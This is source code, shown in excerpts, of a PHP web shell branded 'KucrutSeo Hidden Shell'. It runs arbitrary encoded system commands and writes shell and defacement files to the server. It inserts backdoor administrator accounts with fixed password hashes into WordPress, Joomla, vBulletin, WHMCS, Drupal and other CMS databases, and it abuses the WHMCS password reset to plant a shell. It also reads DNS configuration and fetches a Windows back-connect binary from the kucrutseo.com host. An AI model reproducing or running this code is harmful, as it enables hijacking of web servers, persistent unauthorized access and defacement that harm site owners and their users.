...
function _kucrut_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$out = "";
		if(strpos($data, "[kucrutseo~api]") !== false && strpos($data, '[kucrutseo~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
...
if(isset($_GET["kucrutseo"])){
@error_reporting(E_ALL ^ E_NOTICE);
echo '<html>';
echo "<title>KucrutSeo Hidden Shell</title>";
...
echo '<hr><form onSubmit="this.execute.disabled=true;this.command_kucrutseo.value = btoa(unescape(encodeURIComponent(this.command_kucrutseo.value)));" method="POST">Execute Command: <input name="command_kucrutseo" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
<hr><pre>';
if(isset($_POST['command_kucrutseo'])){
if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
$kucrutseo = "cd '".addslashes(str_replace("\\","/",@kucrutGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_kucrutseo']);
echo kucrutEx($kucrutseo);
}
echo'</pre>
</body></html>';
exit;}
...
$kucrut_uploader = '$x = base64_decode("'.$GLOBALS['__HOST_SHELL_CODE'].'");$kucrutseo = fopen("kucrutseo.php","w");fwrite($kucrutseo,$x);';
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?kucrutseo"><span style="color:#42ff59;">'.__HOST_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__HOST_VERSION__.'</span></small></a></div>
...
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="kucrut_kucrutseo"><center><a href="https://t.me/kucrutseo" target="_blank"><span><font class="kucrutseo-text" color="#0F0">Kucrut Team</font></span></a></center></div></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://kucrutseo.com/images/btn.png';
	$s['kucrutmini']='https://kucrutseo.com/images/alfamini.png';
...
$curl = new KucrutCURL();
$content = $curl->Send("https://kucrutseo.com/market.php");
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['kucrut3'])?$GLOBALS['DB_NAME']['user']:$_POST['kucrut3']).'" placeholder="kucrutseo"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['kucrut5']=='>>'){
echo __pre();
...
$template = '<tr><td style="text-align:center;"><a href="https://kucrutseo.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
$x = 1;
foreach($GLOBALS['__HOST_COLOR__'] as $key => $value){
	$multi = "";
	if(is_array($value)){
...
echo '<div class="header">';
$news = new KucrutCURL();
$about_us = $news->Send("https://kucrutseo.com/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='https://kucrutseo.com/images/farvahar-iran.png'><br>
<b><font size='+3' color='#f20b0b'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#f20b0b'>Shell By Kucrut</font><br>
</center></pre><iframe src='tg://resolve?domain=kucrutseo' frameborder='0' width='0' height='0'></iframe>";
}
echo __pre().$about_us;
echo('</div>');
kucrutfooter();
...
$create = "insert into tblclients (email) values('kucrutseo@fbi.gov')";
...
$KucrutSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=kucrutseo@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$KucrutSeo = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert("shell injectet...");
$ff= 'http://'.$path."/kucrutseo.php";
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>kucrutseo@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/kucrutseo.php' target='_blank'>".$path."/kucrutseo.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
...
if($res){
$ff = 'http://'.$realurl.$realpath."/kucrutseo.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/kucrutseo.php";
...
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"https://kucrutseo.com/icons/menu/newtab.svg\"> Open in new tab</a>
  <a target='_blank' href='' name='link'><img src=\"https://kucrutseo.com/icons/menu/link.svg\"> Open file directly</a>
  <a href='javascript:void(0);' name='download'><img src=\"https://kucrutseo.com/icons/menu/download2.svg\"> Download</a>
  <a href='' name='view'><img src=\"https://kucrutseo.com/icons/menu/view.svg\"> View</a>
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"https://kucrutseo.com/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"https://kucrutseo.com/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"https://kucrutseo.com/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"https://kucrutseo.com/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"https://kucrutseo.com/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"https://kucrutseo.com/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"permission\");' name='permission'><img src=\"https://kucrutseo.com/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"https://kucrutseo.com/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"https://kucrutseo.com/icons/menu/increase.svg\"> Extract</a>
...
if(isset($_POST['kucrut6'])){
$s0levisible="Powered By KucrutSeo";
$dbu = $_POST['kucrut6'];
$path = $_POST['kucrut5'];
$fname = $_POST['kucrut4'];
$dbn = $_POST['kucrut7'];
...
$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $kucrutseo = fopen("'.$fname.'","w"); fwrite($kucrutseo,$x);';
...
echo __pre();
$kucrutseo9 = _kucrut_file('/etc/named.conf');
if(is_array($kucrutseo9)){
foreach($kucrutseo9 as $kucrutseo13){
if(@eregi('zone',$kucrutseo13)){
preg_match_all('#zone "(.*)"#',$kucrutseo13,$kucrutseo14);
if(strlen(trim($kucrutseo14[1][0])) > 2){
echo $kucrutseo14[1][0].'<br>';
}}}
}
}else{
echo __pre();
...
$s = $kucrut->Send('https://kucrutseo.com/bc/windows.exe');
$tmpdir = KUCRUT_TEMPDIR;
...
$table = array('td1' =>
 ...
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'kucrutseo', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'kucrutseo@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$kucrutseo=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
$sole = @mysqli_num_rows($kucrutseo);
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($kucrutseo);
$res = $solevis['ID'];
}
$kucrutseo=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','kucrutseo'),(null,'".$res."','last_name','kucrutseo'),(null,'".$res."','nickname','kucrutseo'),(null,'".$res."','description','kucrutseo'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($kucrutseo){
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'kucrutseo', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'kucrutseo@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$prefix = $_POST['kucrut10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
$sole =@mysqli_num_rows($kucrutseo);
if ($sole == 1){
$solevis =@mysqli_fetch_assoc($kucrutseo);
$res = $solevis['id'];
}
$kucrutseo=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
if($kucrutseo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'kucrutseo', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'kucrutseo@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$adm_perm = "16744444";
if($pw_col > 0){
$kucrutseo=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$kucrutseo=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$kucrutseo=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($kucrutseo);
if($sole == 1){
$solevis = mysqli_fetch_assoc($kucrutseo);
$res = $solevis['userid'];
}
$kucrutseo=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($kucrutseo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5('kucrutseo');
$kucrutseo=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
if($kucrutseo){
__alert('Success... '.$admin.' is created...');
}
}
...
$SQL = $_POST['kucrut9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysqli_error($conn));
if($kucrutseo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$prefix = $_POST['kucrut10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysqli_error($conn));
if($kucrutseo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5($pwd);
$kucrutseo=@mysqli_query($conn,"insert into ".$prefix."_authors(aid,name,email,pwd) values('$admin','God','$SQL','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
if($kucrutseo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$kucrutseo=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','kucrutseo@fbi.gov','filtered_html','1','Europe/Berlin','kucrutseo@fbi.gov')") or die(mysqli_error($conn));
$kucrutseo=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($kucrutseo);
if ($sole == 1){
$solevis = mysqli_fetch_assoc($kucrutseo);
$res = $solevis['uid'];
}
$kucrutseo=@mysqli_query($conn,"INSERT INTO users_roles (uid,rid) VALUES ('".$res."', '3')") or die(mysqli_error($conn));
if($kucrutseo){
__alert('Success... '.$admin.' is created...');}
}
}
...
$admin = $_POST['kucrut8'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$setpwAlg = sha1(strtolower($admin) . 'kucrutseo');
$kucrutseo=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','kucrutseo@fbi.gov')") or die(mysqli_error($conn));
if($kucrutseo){
__alert('Success... '.$admin.' is created...');}
}
}
...
if($sole){
	foreach($sole as $visible){
		if(@strstr($visible,":")){
			$kucrutseo = explode(':', $visible);
			$cwd = str_replace("{user}", trim($kucrutseo[1]), $makepwd);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($kucrutseo[1]), trim($kucrutseo[0]), $cwd), $template);
		}
	}
}else{
...
break;
case 'pgsql':
$this->query("CREATE TABLE kucrutseo(file text);COPY kucrutseo FROM '".addslashes($str)."';select file from kucrutseo;");
$r=array();
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('drop table kucrutseo');
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://kucrutseo.com/images/farvahar-iran.png\"></p>";
